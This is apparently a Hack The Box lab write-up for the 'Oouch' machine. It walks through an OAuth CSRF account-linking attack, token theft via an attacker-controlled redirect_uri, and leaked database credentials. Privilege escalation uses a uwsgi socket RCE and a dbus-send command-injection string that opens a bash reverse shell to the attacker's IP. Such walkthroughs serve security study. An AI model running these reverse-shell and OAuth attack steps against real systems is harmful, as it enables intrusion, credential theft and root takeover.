---
description: OAuth is cool (and messes my brain up).
---

# Oouch

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.29.195
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 00:16 EST
Nmap scan report for 10.129.29.195
Host is up (0.022s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
5000/tcp open  upnp
8000/tcp open  http-alt
```

### FTP Anonymous Accss

I checked for anonymous access to the FTP server, and it works. We can download a `project.txt` file from it. These are the contents:

```
$ cat project.txt 
Flask -> Consumer
Django -> Authorization Server
```

Might need this information later. Also, we can see that this is the user `qtc` server.

<figure><img src="../../../.gitbook/assets/image (1901).png" alt=""><figcaption></figcaption></figure>

### Port 5000

This webpage just shows a login page:

<figure><img src="../../../.gitbook/assets/image (3462).png" alt=""><figcaption></figcaption></figure>

I registered a user and logged in to see the dashboard.

<figure><img src="../../../.gitbook/assets/image (3959).png" alt=""><figcaption></figcaption></figure>

There are 3 main functions, a Password Change, Documents and the Contact one. The Password Change is not interesting, Documents are only available for the administrator user. That just leaves  the Contact function.

<figure><img src="../../../.gitbook/assets/image (2125).png" alt=""><figcaption></figcaption></figure>

This looks like an XSS platform to somehow steal the administrator cookie. When trying to submit a basic XSS payload, this is what I got:

<figure><img src="../../../.gitbook/assets/image (1634).png" alt=""><figcaption></figcaption></figure>

Further testing of this endpoint revealed that the administrator clicks links that are sent in that Contact Form. Could be useful later. I ran a `gobuster` scan on the machine to see what other endpoints are hidden. I found a weird `/oauth` endpoint that could be of use: (this took a lot of wordlists to do)

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://10.129.29.195:5000/ -t 150 | grep -v 502 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.29.195:5000/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/03/09 00:37:10 Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 302) [Size: 247] [--> http://10.129.29.195:5000/login?next=%2Fabout]
/contact              (Status: 302) [Size: 251] [--> http://10.129.29.195:5000/login?next=%2Fcontact]
/documents            (Status: 302) [Size: 255] [--> http://10.129.29.195:5000/login?next=%2Fdocuments]
/home                 (Status: 302) [Size: 245] [--> http://10.129.29.195:5000/login?next=%2Fhome]
/logout               (Status: 302) [Size: 219] [--> http://10.129.29.195:5000/login]
/login                (Status: 200) [Size: 1828]
/oauth                (Status: 302) [Size: 247] [--> http://10.129.29.195:5000/login?next=%2Foauth]
/register             (Status: 200) [Size: 2109]
/profile              (Status: 302) [Size: 251] [--> http://10.129.29.195:5000/login?next=%2Fprofile]
```

We can head to that and see what it does.

### Oauth

This gives us instructions on how to connet to the OAuth server running on this machine:

<figure><img src="../../../.gitbook/assets/image (1994).png" alt=""><figcaption></figcaption></figure>

When trying to access it, it attempts to access `authorization.oouch.htb:8000`. So the OAuth server is running on port 8000.

Using the connect options shows us this:

<figure><img src="../../../.gitbook/assets/image (3894).png" alt=""><figcaption></figcaption></figure>

When we click authorize, we just are logged in as the same user it seems.&#x20;

### Authorisation Server&#x20;

On Port 8000, all we see is this:

<figure><img src="../../../.gitbook/assets/image (2680).png" alt=""><figcaption></figcaption></figure>

When are visiting this port from port 5000 via OAuth, this is the request that gets sent:

```http
GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://oouch.htb:5000/
Connection: close
Cookie: csrftoken=CHNQoemrMXB0fSL1ww9wI1NPq7GSYoCHqWWxW9FW7ZQpfflFeHATfHu00krDHJ8i
Upgrade-Insecure-Requests: 1

```

And this is the page that gets shown to us:

<figure><img src="../../../.gitbook/assets/image (3176).png" alt=""><figcaption></figcaption></figure>

When visiting `http://authorization.oouch.htb:8000`, we can see how to register to this server:

<figure><img src="../../../.gitbook/assets/image (3436).png" alt=""><figcaption></figcaption></figure>

In case you're unaware of OAuth 2.0, you can read this:

{% embed url="https://portswigger.net/web-security/oauth" %}

It basically is the service that allows us to 'Login with Facebook' or other social media. The exploit here is to somehow use this faulty OAuth implementation to login as the administrator of the website and view the documents, which might contain some useful information.

For now, we can register a user and keep enumerating this website. This is the page we get to after logging in:

<figure><img src="../../../.gitbook/assets/image (381).png" alt=""><figcaption></figcaption></figure>

Clicking these two options don't seem to do much. I ran a `gobuster` scan once again.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://authorization.oouch.htb:8000/oauth -t 150 | grep -v 502
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://authorization.oouch.htb:8000/oauth
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/03/09 00:47:42 Starting gobuster in directory enumeration mode
===============================================================
/applications         (Status: 301) [Size: 0] [--> /oauth/applications/]
/authorize            (Status: 301) [Size: 0] [--> /oauth/authorize/]
```

We can see a new endpont at `/applications`. Trying to access this requires credentials:

<figure><img src="../../../.gitbook/assets/image (1821).png" alt=""><figcaption></figcaption></figure>

I did not have any credentials for now. After creating this account and re-testing, using the `/oauth/connect` function earlier now shows a different user profile.

<figure><img src="../../../.gitbook/assets/image (3808).png" alt=""><figcaption></figcaption></figure>

The website recognises my new OAuth account that I created and is considered 'connected'.&#x20;

### OAuth Forced Linking

Here's an overview of how exactly OAuth works:

<figure><img src="../../../.gitbook/assets/image (2151).png" alt=""><figcaption></figcaption></figure>

We can view the HTTP requests throguh Burpsuite to see what exactly is happening.

<figure><img src="../../../.gitbook/assets/image (2169).png" alt=""><figcaption></figcaption></figure>

These 4 requests are essentially the OAuth mechanism, and there is the access token in a POST request. Our goal is to authenticate as `qtc`, since he probably is the administrator user of this machine. As such, we can use a CSRF attack because this implementation of OAuth does not seem to send the `state` parameter. Earlier, we found a method to make the administrator `qtc` click links by sending it in the Contact form.&#x20;

This can be used to link the `qtc` account to ours.&#x20;

To exploit this, we first need to create some kind of new account and intercept the POST request created from accessing `/oauth/connect` . We need to intercept this response:

```http
POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 266
Origin: http://authorization.oouch.htb:8000
Connection: close
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
Cookie: csrftoken=aWzHarmWI5F3jiPsMIUB7tlpiFp0RMRAGmsWcW30NkvqWZaSiaYfT8VzwTGQ3vYc; sessionid=170pg3ogrhqjivnxsxn4wvt8ld65rd4g
Upgrade-Insecure-Requests: 1



csrfmiddlewaretoken=v9wy7hWoUCz9Z5GQi5XBkH0zo21kut2aGlNFwNPiNTvAtHvs8N7iq6XU1acH3Y1P&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
```

We can forward this request and retrieve the next:

```http
GET /oauth/connect/token?code=IhKT0Gc97DNDoVQp2Urhfun5pcl4Vj HTTP/1.1
Host: consumer.oouch.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/
Connection: close
Cookie: session=.eJwlT8tqAzEM_BXjcyh-y85X9F5CkGQpuzTNlvXmFPLvNRQEwyDNQy971TuORYY9f72sOSbYHxkDb2JP9vMuOMTct5tZH-bYDDLPpTmWdZjfefNhL-_LaZrsMhZ7PvanTLZ2e7Y5S_elq3poEVJTqNqEci0uFQzJKTM4yqFw1NKRcoy--Uqt-hQlEdQguceK2TUlUc2F_RxyiYtn0OnRa0SHoUIsBAqJZ1ymVrLSrM9j1-uxfctj9kFIHiJqIS6BqwhqyJ1gilxJjBywQsp-6p5D9v8ngn3_AcFgVkE.ZA1w3A.rxmnxwIcngbjUG5bfhtMo3YL0G0
Upgrade-Insecure-Requests: 1

```

This is request that links accounts together. **We need to drop this using Burpsuite and save the code sent.** Afterwards, we can create a malicious link for `qtc` to click:

```
http://consumer.oouch.htb:5000/oauth/connect/token?code=IhKT0Gc97DNDoVQp2Urhfun5pcl4Vj
```

&#x20;Send this in the Contact Form and wait for a little bit. Then, we can attempt to use OAuth by accessing `/oauth/login` on the consumer server. If done correctly, this is what we would see in the Documents section:

<figure><img src="../../../.gitbook/assets/image (2649).png" alt=""><figcaption></figcaption></figure>

Great! Now we have credentials to access some other stuff. There's an SSH key somewhere on this  website as well.

### Registering -> Steal Token

Now that we have credentials, we can register somewhere. I used `gobuster` to scan the authorization server, and found another endpoint at `/oauth/applications/register`.&#x20;

<figure><img src="../../../.gitbook/assets/image (3047).png" alt=""><figcaption></figcaption></figure>

Based on the documents, it seems that the `/api/get_user` endpoint supports a GET method, meaning the authorization parameter is probably a token. Problem is, we don't have any credentials or tokens from `qtc`, we only forced a link. The next step is to steal a token or password, and I'm guessing we need him to click another link.

We can create a fake request that redirects the user to our our machine. This works because we have all the parameters we need on this page alone.&#x20;

As such, we can fill up the registering form as such:

<figure><img src="../../../.gitbook/assets/image (3146).png" alt=""><figcaption></figcaption></figure>

This article was useful in reading about how these requests are constructed.

{% embed url="https://www.oauth.com/oauth2-servers/authorization/the-authorization-request/" %}

{% code overflow="wrap" %}
```
http://authorization.oouch.htb:8000/oauth/authorize?client_id=g2uRKpKRQBvO7OXm8A1uBNuxWpcgflZYfWoLKRzR&redirect_uri=http://10.10.14.39&grant_type=authorization_code&client_secret=Wn49XJLzIuvRACjBLnYZN2tdFc3UI3416zHjSyAB1a2D5ar1zGzzlsEZX6UN96uW4TQlIrGUNhKEwTrl6xJctO2CSXVBNjbE76zdlteHRjT4cjSn2nLYAsBlIpKgOSRh
```
{% endcode %}

Then we can listen on port 80 to capture the request being sent

<figure><img src="../../../.gitbook/assets/image (2838).png" alt=""><figcaption></figcaption></figure>

### /oauth/token

After getting this token, I was stuck for a long while. I was back to this page and realised I never really look at the `/oauth/token` function here:

<figure><img src="../../../.gitbook/assets/image (573).png" alt=""><figcaption></figcaption></figure>

Viewing the HTTP request, I realised that the `sessionid` token could be used to login as `qtc`.

<figure><img src="../../../.gitbook/assets/image (1482).png" alt=""><figcaption></figcaption></figure>

Afterwards, accessing the `/oauth/token` endpoint did nothing for me until I experimented with sending POST requests:

<figure><img src="../../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

We can read more about grant\_types here:

{% embed url="https://developer.okta.com/blog/2018/04/10/oauth-authorization-code-grant-type" %}

By controlling the grant type, we can requests for the client\_credentials. This can be done by first going to the Register page and changing the grant type:

<figure><img src="../../../.gitbook/assets/image (2178).png" alt=""><figcaption></figcaption></figure>

Then we can send a reuqest specifying the client ID, client secret and the grant type and the token for `qtc` will be given to us:

<figure><img src="../../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

This `access_token` parameter is the API token we need!

### API SSH Keys

Now we can test the `/api/get_user` endpoint with our new access\_token and the seessionid.

```http
GET /api/get_ssh?access_token=O0Qwa2XObArpMZDhk3obUT4DLOgvH7 HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=aWzHarmWI5F3jiPsMIUB7tlpiFp0RMRAGmsWcW30NkvqWZaSiaYfT8VzwTGQ3vYc; sessionid=u46fo2dio2uyqksl1t3by906cbrcz4te
Upgrade-Insecure-Requests: 1

```

<figure><img src="../../../.gitbook/assets/image (687).png" alt=""><figcaption></figcaption></figure>

Now that we have access to this, we need to find the SSH key. After testing out a few endpoints, I found that `get_ssh` was the right one.

<figure><img src="../../../.gitbook/assets/image (1512).png" alt=""><figcaption></figcaption></figure>

Then we can just SSH in as `qtc`.&#x20;

<figure><img src="../../../.gitbook/assets/image (2789).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Docker Enumeration

Checking the home directory of this user reveals some interesting notes.

```
qtc@oouch:~$ cat .note.txt 
Implementing an IPS using DBus and iptables == Genius?
```

I ran `pspy64` on the machine to see what's running. Based on the hint, I should be looking at some kind of Intrusion Prevention System (IPS). There, I found some interesting lines:

```
2023/03/12 08:30:01 CMD: UID=0    PID=3649   | /bin/sh -c /usr/sbin/iptables -F PREROUTING -t mangle                                                                                      
2023/03/12 08:30:01 CMD: UID=0    PID=3648   | /usr/bin/python3 /root/get_pwnd.py
2023/03/12 08:29:24 CMD: UID=0    PID=2668   | /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8000 -container-ip 172.18.0.5 -container-port 8000                            
2023/03/12 08:29:24 CMD: UID=0    PID=2647   | /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.18.0.4 -container-port 5000
```

There was some kind of cronjob going on, and there are docker containers present in this machine.  Checking the output of `ip addr` reveals some docker containers are indeed present:

```
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:c6:fa:ee:37 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-ac0a6de99daf: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:07:cf:da:64 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-ac0a6de99daf
       valid_lft forever preferred_lft forever
    inet6 fe80::42:7ff:fecf:da64/64 scope link 
       valid_lft forever preferred_lft forever
```

We can probably SSH into some of them. Rough guesing let me SSH into `172.18.0.4`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1423).png" alt=""><figcaption></figcaption></figure>

Checking the processes, we see a lot of `uswgi` processes running:

```
qtc@de8d92c274d6:/opt$ ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 06:23 ?        00:00:00 /bin/bash ./start.sh
root        17     1  0 06:23 ?        00:00:00 /usr/sbin/sshd
root        30     1  0 06:23 ?        00:00:00 nginx: master process /usr/sbin/nginx
www-data    31    30  0 06:23 ?        00:00:00 nginx: worker process
www-data    32     1  0 06:23 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    33    30  0 06:23 ?        00:00:00 nginx: worker process
www-data    34    32  0 06:23 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    35    32  0 06:23 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    36    32  0 06:23 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    37    32  0 06:23 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    38    32  0 06:23 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    39    32  0 06:23 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    40    32  0 06:23 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    41    32  0 06:23 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    42    32  0 06:23 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    43    32  0 06:23 ?        00:00:00 uwsgi --ini uwsgi.ini --chmod-sock=666
```

`uwsgi` is a hosting service like nginx. Witin this docker, we can also find some files pertaining to a server running.

```
qtc@de8d92c274d6:/code$ ls
Dockerfile       config.py    key         nginx.conf  requirements.txt  urls.txt
authorized_keys  consumer.py  migrations  oouch       start.sh          uwsgi.ini
```

Here are the contents of `config.py`.

```python
import os

basedir = os.path.abspath(os.path.dirname(__file__))

class Config(object):
    # ...
    SQLALCHEMY_DATABASE_URI = 'mysql://qtc:clarabibi2019!@database.consumer.oouch.htb/Consumer'
    SQLALCHEMY_TRACK_MODIFICATIONS = False

    SECRET_KEY = os.environ.get('SECRET_KEY') or 'klarabubuklarabubuklarabubuklarabubu'
```

And the contents of the `uwsgi` config:

```
[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = tru
```

Interesting. At the start of the machine, the application banned our IP address. Reading `routes.py` shows us how that function works:

```python
@app.route('/contact', methods=['GET', 'POST'])
@login_required
def contact():
    '''
    The contact page is required to abuse the Oauth vulnerabilities. This endpoint allows the user to send messages using a textfield.
    The messages are scanned for valid url's and these urls are saved to a file on disk. A cronjob will view the files regulary and
    invoke requests on the corresponding urls.

    Parameters:
        None

    Returns:
        render                (Render)                  Renders the contact page.
    '''
    # First we need to load the contact form
    form = ContactForm()

    # If the form was already submitted, we process the contents
    if form.validate_on_submit():

        # First apply our primitive xss filter
        if primitive_xss.search(form.textfield.data):
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

            client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)  
            response = block_iface.Block(client_ip)
            bus.close()
            return render_template('hacker.html', title='Hacker')

        # The regex defined at the beginning of this file checks for valid urls
        url = regex.search(form.textfield.data)
        if url:

            # If an url was found, we try to save it to the file /code/urls.txt
            try:
                with open("/code/urls.txt", "a") as url_file:
                    print(url.group(0), file=url_file)
            except:
                print("Error while openeing 'urls.txt'")

        # In any case, we inform the user that has message has been sent
        return render_template('contact.html', title='Contact', send=True, form=form)

    # Except the functions goes up to here. In this case, no form was submitted and we do not need to inform the user
    return render_template('contact.html', title='Contact', send=False, form=form)
```

`dbus` is being used to block the IP address. Basically, when an entity is detected to be using SSS, `dbus` is used to send the client IP to `iptables` (which was found from the cronjob) and it closes the connection. Then, the attacker is blocked for one minute. We can read the configuration file for this on the main machine in another SSH shell:

```markup
qtc@oouch:/etc/dbus-1/system.d$ cat htb.oouch.Block.conf 
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig>
    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>
        <policy user="www-data">
                <allow send_destination="htb.oouch.Block"/>
                <allow receive_sender="htb.oouch.Block"/>
        </policy>
</busconfig>
```

### uwsgi Privilege Escalation

Based on the configuration file, there's a severe misconfiguration because the `www-data` user is able to receive and send messages via `dbus`. As such, the next step is to somehow get a shell as `www-data`. This can be done using a `uwsgi` RCE exploit.

{% embed url="https://github.com/wofeiwo/webcgi-exploits" %}

I'm not going to pretend I can understand and read the explanation of the exploit in Chinese. **Before sending this file over, we need to remove the import bytes portion**. Then, we can import this file into our machine, transfer it to the main machine and then the Docker container.&#x20;

We can set up a listener port on the main machine, and execute use a simple bash one-liner to get a reverse shell:

```
qtc@de8d92c274d6:~$ python3 rce.py -m unix -u /tmp/uwsgi.socket -c 'bash -c "bash -i >& /detcp/172.18.0.1/4444 0>&1"'
[*]Sending payload.
```

<figure><img src="../../../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>

### DBus RCE

As `www-data`, we have some permissions over `dbus`. Well, Hacktricks kinda spoiled the exploit for me because it revealed the exact command to use to get RCE as root using `dbus-send`.

How this exploit works is that the main machine is running `iptables` to block the IP addresses (remember the cronjob?). As such, we can try to test whether the input being sent there is sanitised. If it is not, we have a chance to inject code. To do this, we would need a method to send `dbus` messages, and this can be done with `dbus-send`.&#x20;

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation#exploit-it" %}

We can append the RCE exploit at the back. Since the `iptables` portion is being handled by the `root` user on the main machine, the command is run as `root`, giving us a root shell!

```
www-data@de8d92c274d6:/tmp$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';bash -c "bash -i >& /dev/tcp/10.10.14.39/4444 0>&1" #'
<h -c "bash -i >& /dev/tcp/10.10.14.39/4444 0>&1" #'                                         
method return time=1678608399.001859 sender=:1.3 -> destination=:1.436 serial=4 reply_serial=2                                                                                            
   string "Carried out :D"
```

<figure><img src="../../../.gitbook/assets/image (1045).png" alt=""><figcaption></figcaption></figure>

I wonder why this machine isn't in Insane level...
